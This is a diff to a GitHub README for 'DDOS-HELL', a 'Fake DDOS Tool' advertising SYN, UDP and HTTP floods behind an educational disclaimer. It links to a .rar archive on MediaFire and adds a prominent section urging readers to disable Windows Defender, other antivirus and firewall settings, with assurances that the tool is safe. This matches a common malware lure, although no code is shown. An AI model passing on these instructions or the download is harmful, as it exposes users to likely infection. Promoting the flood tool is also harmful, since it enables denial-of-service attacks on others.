@@ -19,15 +19,11 @@
    <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
 </p>
 
-
 ### About the Tool
 
 The Fake DDOS Tool is a sophisticated software application designed for ethical hackers and cybersecurity professionals. It provides a controlled environment for simulating Distributed Denial of Service (DDOS) attacks, offering valuable insights and practical experience in cybersecurity testing and education.
 
-
-
-
-## Project Status: Active Development 🌟
+## Project Status: Ongoing Development 🚀
 
 We are actively developing and refining this project to enhance its features and functionality. Your feedback and contributions are invaluable as we continue to improve and expand its capabilities.
 
@@ -35,19 +31,13 @@ Expect regular updates with new features, bug fixes, and optimizations. Join us 
 
 Stay tuned for exciting updates and feel free to reach out with any questions or suggestions!
 
-
-
-
-
 ## Contents
 
 - [📥 Download](#download)
 - [✨ Features](#features)
-- [⚠️ Disclaimer](#disclaimer)
+- [⚠️ Disclaimer](#disclaimer-and-educational-use)
 - [🔧 Requirements](#requirements)
 - [📋 How to Use](#how-to-use)
-
-
 
 ## Features
 
@@ -62,10 +52,11 @@ Stay tuned for exciting updates and feel free to reach out with any questions or
 - **Multiple Attack Vectors**: Supports multiple attack types like SYN flood, UDP flood, HTTP flood, etc.
 - **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-## Disclaimer
+## Disclaimer and Educational Use
 
-**Disclaimer:** This tool is for educational and research purposes only. The creator does not condone or support any illegal activities. By using this tool, you agree to use it responsibly and at your own risk.
+**Disclaimer:** The Fake DDOS Tool is strictly intended for educational and research purposes. Users are responsible for complying with all applicable laws and regulations. Misuse of this tool for unauthorized activities is prohibited.
 
+**📚 Educational Use:** The tool is developed to enhance understanding of DDOS attack methodologies and their impact on systems. It is intended for use in controlled environments where ethical hacking and cybersecurity training are conducted under legal and ethical guidelines.
 
 ## Requirements
 
@@ -79,7 +70,6 @@ Stay tuned for exciting updates and feel free to reach out with any questions or
 | [✓] Multi-core CPU recommended to handle workloads                   | 🔄     |
 | [✓] At least 100 MB of free disk space for installation and usage   | 📂     |
 
-
 ## How to Use
 
 | **🔥😈 DDOS HELL 😈 🔥** |
@@ -92,23 +82,32 @@ Stay tuned for exciting updates and feel free to reach out with any questions or
 
 
 
+## **🚨 IMPORTANT: DISABLE YOUR ANTIVIRUS BEFORE USING THE TOOL 🚨**
+
+Before using the Fake DDOS Tool, make sure to disable your antivirus software. This is crucial as the tool might be flagged and blocked due to its nature. Ensure that you have understood the risks and have taken necessary precautions.
+
+🔴 **Disable Antivirus:**
+   - Windows Defender
+   - Any third-party antivirus software
+   - Firewall settings that might interfere
+
+
+
 ## Download
 
 <p align="center">
    <a href="https://www.mediafire.com/file/4wkse512y7npcy1/DDOS-HELL.rar/file">
-      <img src="https://github.com/cyberpaklnd/DDOS-HELL/assets/174629419/412a951f-dcc0-45ec-927b-a3f88440813c" width="400" alt="Click here to download">
+      <img src="https://github.com/cyberpaklnd/DDOS-HELL/assets/174629419/7e3d2907-37fc-468c-a7a2-b0d44dd76522" width="400" alt="Click here to download">
    </a>
 </p>
 <p align="center">
    ⬆️ <strong>Click the image above to download the tool</strong> ⬆️
-
-
-## Disclaimer and Educational Use
-
-**Disclaimer:** The Fake DDOS Tool is strictly intended for educational and research purposes. Users are responsible for complying with all applicable laws and regulations. Misuse of this tool for unauthorized activities is prohibited.
-
-**Educational Use:** The tool is developed to enhance understanding of DDOS attack methodologies and their impact on systems. It is intended for use in controlled environments where ethical hacking and cybersecurity training are conducted under legal and ethical guidelines.
+</p>
 
 
 
+
+## **⚠️Note**
+
+**The tool is safe to use for educational purposes, but antivirus software might still flag it. Disabling your antivirus temporarily will ensure smooth operation.**
 
